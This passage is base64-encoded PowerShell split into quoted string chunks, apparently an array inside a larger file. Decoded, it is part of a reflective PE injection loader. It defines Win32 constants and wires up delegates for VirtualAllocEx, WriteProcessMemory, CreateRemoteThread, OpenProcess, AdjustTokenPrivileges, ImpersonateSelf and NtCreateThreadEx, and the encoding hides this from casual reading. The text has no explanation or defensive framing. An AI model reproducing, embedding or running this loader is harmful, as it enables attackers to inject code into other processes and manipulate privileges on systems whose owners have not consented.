09MVVRFIC1WYWx1ZSAwCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfUkVMX0JBU0VEX0hJR0hMT1cgLVZhbHVlIDMKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9SRUxfQkFTRURfRElSNjQgLVZhbHVlIDEwCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfU0NOX01FTV9ESVNDQVJEQUJMRSAtVmFsdWUgMHgwMjAwMDAwMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NDTl9NRU1fRVhFQ1VURSAtVmFsdWUgMHgyMDAwMDAwMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NDTl9NRU1fUkVBRCAtVmFsdWUgMHg0MDAwMDAwMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NDTl9NRU1fV1JJVEUgLVZhbHVlIDB4ODAwMDAwMDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9TQ05fTUVNX05PVF9DQUNIRUQgLVZhbHVlIDB4MDQwMDAwMDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNRU1fREVDT01NSVQgLVZhbHVlIDB4NDAwMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0ZJTEVfRVhFQ1VUQUJMRV9JTUFHRSAtVmFsdWUgMHgwMDAyCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfRklMRV9ETEwgLVZhbHVlIDB4MjAwMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0RMTENIQVJBQ1RFUklTVElDU19EWU5BTUlDX0JBU0UgLVZhbHVlIDB4NDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfTlhfQ09NUEFUIC1WYWx1ZSAweDEwMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE1FTV9SRUxFQVNFIC1WYWx1ZSAweDgwMDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBUT0tFTl9RVUVSWSAtVmFsdWUgMHgwMDA4CgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgVE9LRU5fQURKVVNUX1BSSVZJTEVHRVMgLVZhbHVlIDB4MDAyMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFNFX1BSSVZJTEVHRV9FTkFCTEVEIC1WYWx1ZSAweDIKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBFUlJPUl9OT19UT0tFTiAtVmFsdWUgMHgzZjAKCQkKCQlyZXR1cm4gJFdpbjMyQ29uc3RhbnRzCgl9CgoJRnVuY3Rpb24gR2V0LVdpbjMyRnVuY3Rpb25zCgl7CgkJJFdpbjMyRnVuY3Rpb25zID0gTmV3LU9iamVjdCBTeXN0ZW0uT2JqZWN0CgkJCgkJJFZpcnR1YWxBbGxvY0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvYwoJCSRWaXJ0dWFsQWxsb2NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKCQkkVmlydHVhbEFsbG9jID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVG",
		"b3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxBbGxvY0FkZHIsICRWaXJ0dWFsQWxsb2NEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBWaXJ0dWFsQWxsb2MgLVZhbHVlICRWaXJ0dWFsQWxsb2MKCQkKCQkkVmlydHVhbEFsbG9jRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2NFeAoJCSRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKCQkkVmlydHVhbEFsbG9jRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEFsbG9jRXhBZGRyLCAkVmlydHVhbEFsbG9jRXhEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBWaXJ0dWFsQWxsb2NFeCAtVmFsdWUgJFZpcnR1YWxBbGxvY0V4CgkJCgkJJG1lbWNweUFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgbXN2Y3J0LmRsbCBtZW1jcHkKCQkkbWVtY3B5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0pIChbSW50UHRyXSkKCQkkbWVtY3B5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJG1lbWNweUFkZHIsICRtZW1jcHlEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBtZW1jcHkgLVZhbHVlICRtZW1jcHkKCQkKCQkkbWVtc2V0QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBtc3ZjcnQuZGxsIG1lbXNldAoJCSRtZW1zZXREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludDMyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKCQkkbWVtc2V0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJG1lbXNldEFkZHIsICRtZW1zZXREZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBtZW1zZXQgLVZhbHVlICRtZW1zZXQKCQkKCQkkTG9hZExpYnJhcnlBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBMb2FkTGlicmFyeUEKCQkkTG9hZExpYnJhcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbU3RyaW5nXSkgKFtJbnRQdHJdKQoJCSRMb2FkTGlicmFyeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRMb2FkTGlicmFyeUFkZHIsICRMb2FkTGlicmFyeURlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIExvYWRMaWJyYXJ5IC1WYWx1ZSAkTG9hZExpYnJhcnkKCQkKCQkkR2V0UHJvY0FkZHJlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBHZXRQcm9jQWRkcmVzcwoJCSRHZXRQcm9jQWRkcmVzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbU3RyaW5nXSkgKFtJbnRQdHJdKQoJCSRHZXRQcm9jQWRkcmVzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRQcm9jQWRkcmVzc0FkZHIsICRHZXRQcm9jQWRkcmVzc0RlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEdldFByb2NBZGRyZXNzIC1WYWx1ZSAkR2V0UHJvY0FkZHJlc3MKCQkKCQkkR2V0UHJvY0FkZHJlc3NJbnRQdHJBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBHZXRQcm9jQWRkcmVzcyAjVGhpcyBpcyBzdGlsbCBHZXRQcm9jQWRkcmVzcywgYnV0IGluc3RlYWQgb2YgUG93ZXJTaGVsbCBjb252ZXJ0aW5nIHRoZSBzdHJpbmcgdG8gYSBwb2ludGVyLCB5b3UgbXVzdCBkbyBpdCB5b3Vyc2VsZgoJCSRHZXRQcm9jQWRkcmVzc0ludFB0ckRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQoJCSRHZXRQcm9jQWRkcmVzc0ludFB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRQcm9jQWRkcmVzc0ludFB0ckFkZHIsICRHZXRQcm9jQWRkcmVzc0ludFB0ckRlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEdldFByb2NBZGRyZXNzSW50UHRyIC1WYWx1ZSAkR2V0UHJvY0FkZHJlc3NJbnRQdHIKCQkKCQkkVmlydHVhbEZyZWVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsRnJlZQoJCSRWaXJ0dWFsRnJlZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50MzJdKSAoW0Jvb2xdKQoJCSRWaXJ0dWFsRnJlZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsRnJlZUFkZHIsICRWaXJ0dWFsRnJlZURlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IC1OYW1lIFZpcnR1YWxGcmVlIC1WYWx1ZSAkVmlydHVhbEZyZWUKCQkKCQkkVmlydHVhbEZyZWVFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxGcmVlRXgKCQkkVmlydHVhbEZyZWVFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnRQdHJdLCBbVUludDMyXSkgKFtCb29sXSkKCQkkVmlydHVhbEZyZWVFeCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsRnJlZUV4QWRkciwgJFZpcnR1YWxGcmVlRXhEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBWaXJ0dWFsRnJlZUV4IC1WYWx1ZSAkVmlydHVhbEZyZWVFeAoJCQoJCSRWaXJ0dWFsUHJvdGVjdEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxQcm90ZWN0CgkJJFZpcnR1YWxQcm90ZWN0RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKCQkkVmlydHVhbFByb3RlY3QgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbFByb3RlY3RBZGRyLCAkVmlydHVhbFByb3RlY3REZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBWaXJ0dWFsUHJvdGVjdCAtVmFsdWUgJFZpcnR1YWxQcm90ZWN0CgkJCgkJJEdldE1vZHVsZUhhbmRsZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEdldE1vZHVsZUhhbmRsZUEKCQkkR2V0TW9kdWxlSGFuZGxlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1N0cmluZ10pIChbSW50UHRyXSkKCQkkR2V0TW9kdWxlSGFuZGxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldE1vZHVsZUhhbmRsZUFkZHIsICRHZXRNb2R1bGVIYW5kbGVEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBHZXRNb2R1bGVIYW5kbGUgLVZhbHVlICRHZXRNb2R1bGVIYW5kbGUKCQkKCQkkRnJlZUxpYnJhcnlBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBGcmVlTGlicmFyeQoJCSRGcmVlTGlicmFyeURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtCb29sXSkgKFtJbnRQdHJdKQoJCSRGcmVlTGlicmFyeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRGcmVlTGlicmFyeUFkZHIsICRGcmVlTGlicmFyeURlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEZyZWVMaWJyYXJ5IC1WYWx1ZSAkRnJlZUxpYnJhcnkKCQkKCQkkT3BlblByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBPcGVuUHJvY2VzcwoJICAgICRPcGVuUHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtVSW50MzJdLCBbQm9vbF0sIFtVSW50MzJdKSAoW0ludFB0cl0pCgkgICAgJE9wZW5Qcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5Qcm9jZXNzQWRkciwgJE9wZW5Qcm9jZXNzRGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgT3BlblByb2Nlc3MgLVZhbHVlICRPcGVuUHJvY2VzcwoJCQoJCSRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV2FpdEZvclNpbmdsZU9iamVjdAoJICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdKSAoW1VJbnQzMl0pCgkgICAgJFdhaXRGb3JTaW5nbGVPYmplY3QgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIsICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgV2FpdEZvclNpbmdsZU9iamVjdCAtVmFsdWUgJFdhaXRGb3JTaW5nbGVPYmplY3QKCQkKCQkkV3JpdGVQcm9jZXNzTWVtb3J5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV3JpdGVQcm9jZXNzTWVtb3J5CiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIsICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBXcml0ZVByb2Nlc3NNZW1vcnkgLVZhbHVlICRXcml0ZVByb2Nlc3NNZW1vcnkKCQkKCQkkUmVhZFByb2Nlc3NNZW1vcnlBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBSZWFkUHJvY2Vzc01lbW9yeQogICAgICAgICRSZWFkUHJvY2Vzc01lbW9yeURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkUmVhZFByb2Nlc3NNZW1vcnkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkUmVhZFByb2Nlc3NNZW1vcnlBZGRyLCAkUmVhZFByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBSZWFkUHJvY2Vzc01lbW9yeSAtVmFsdWUgJFJlYWRQcm9jZXNzTWVtb3J5CgkJCgkJJENyZWF0ZVJl",
		"bW90ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENyZWF0ZVJlbW90ZVRocmVhZAogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENyZWF0ZVJlbW90ZVRocmVhZEFkZHIsICRDcmVhdGVSZW1vdGVUaHJlYWREZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBDcmVhdGVSZW1vdGVUaHJlYWQgLVZhbHVlICRDcmVhdGVSZW1vdGVUaHJlYWQKCQkKCQkkR2V0RXhpdENvZGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBHZXRFeGl0Q29kZVRocmVhZAogICAgICAgICRHZXRFeGl0Q29kZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkR2V0RXhpdENvZGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0RXhpdENvZGVUaHJlYWRBZGRyLCAkR2V0RXhpdENvZGVUaHJlYWREZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBHZXRFeGl0Q29kZVRocmVhZCAtVmFsdWUgJEdldEV4aXRDb2RlVGhyZWFkCgkJCgkJJE9wZW5UaHJlYWRUb2tlbkFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgQWR2YXBpMzIuZGxsIE9wZW5UaHJlYWRUb2tlbgogICAgICAgICRPcGVuVGhyZWFkVG9rZW5EZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtCb29sXSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQogICAgICAgICRPcGVuVGhyZWFkVG9rZW4gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlblRocmVhZFRva2VuQWRkciwgJE9wZW5UaHJlYWRUb2tlbkRlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE9wZW5UaHJlYWRUb2tlbiAtVmFsdWUgJE9wZW5UaHJlYWRUb2tlbgoJCQoJCSRHZXRDdXJyZW50VGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgR2V0Q3VycmVudFRocmVhZAogICAgICAgICRHZXRDdXJyZW50VGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoKSAoW0ludFB0cl0pCiAgICAgICAgJEdldEN1cnJlbnRUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0Q3VycmVudFRocmVhZEFkZHIsICRHZXRDdXJyZW50VGhyZWFkRGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgR2V0Q3VycmVudFRocmVhZCAtVmFsdWUgJEdldEN1cnJlbnRUaHJlYWQKCQkKCQkkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBBZHZhcGkzMi5kbGwgQWRqdXN0VG9rZW5Qcml2aWxlZ2VzCiAgICAgICAgJEFkanVzdFRva2VuUHJpdmlsZWdlc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbQm9vbF0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgICAgICRBZGp1c3RUb2tlblByaXZpbGVnZXMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzQWRkciwgJEFkanVzdFRva2VuUHJpdmlsZWdlc0RlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEFkanVzdFRva2VuUHJpdmlsZWdlcyAtVmFsdWUgJEFkanVzdFRva2VuUHJpdmlsZWdlcwoJCQoJCSRMb29rdXBQcml2aWxlZ2VWYWx1ZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgQWR2YXBpMzIuZGxsIExvb2t1cFByaXZpbGVnZVZhbHVlQQogICAgICAgICRMb29rdXBQcml2aWxlZ2VWYWx1ZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtTdHJpbmddLCBbU3RyaW5nXSwgW0ludFB0cl0pIChbQm9vbF0pCiAgICAgICAgJExvb2t1cFByaXZpbGVnZVZhbHVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJExvb2t1cFByaXZpbGVnZVZhbHVlQWRkciwgJExvb2t1cFByaXZpbGVnZVZhbHVlRGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTG9va3VwUHJpdmlsZWdlVmFsdWUgLVZhbHVlICRMb29rdXBQcml2aWxlZ2VWYWx1ZQoJCQoJCSRJbXBlcnNvbmF0ZVNlbGZBZGRyID0gR2V0LVByb2NBZGRyZXNzIEFkdmFwaTMyLmRsbCBJbXBlcnNvbmF0ZVNlbGYKICAgICAgICAkSW1wZXJzb25hdGVTZWxmRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludDMyXSkgKFtCb29sXSkKICAgICAgICAkSW1wZXJzb25hdGVTZWxmID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEltcGVyc29uYXRlU2VsZkFkZHIsICRJbXBlcnNvbmF0ZVNlbGZEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJbXBlcnNvbmF0ZVNlbGYgLVZhbHVlICRJbXBlcnNvbmF0ZVNlbGYKCQkKCQkjIE50Q3JlYXRlVGhyZWFkRXggaXMgb25seSBldmVyIGNhbGxlZCBvbiBWaXN0YSBhbmQgV2luNy4gTnRDcmVhdGVUaHJlYWRFeCBpcyBub3QgZXhwb3J0ZWQgYnkgbnRkbGwuZGxsIGluIFdpbmRvd3MgWFAKICAgICAgICBpZiAoKFtFbnZpcm9ubWVudF06Ok9TVmVyc2lvbi5WZXJzaW9uIC1nZSAoTmV3LU9iamVjdCAnVmVyc2lvbicgNiwwKSkgLWFuZCAoW0Vudmlyb25tZW50XTo6T1NWZXJzaW9uLlZlcnNpb24gLWx0IChOZXctT2JqZWN0ICdWZXJzaW9uJyA2LDIpKSkgewoJCSAgICAkTnRDcmVhdGVUaHJlYWR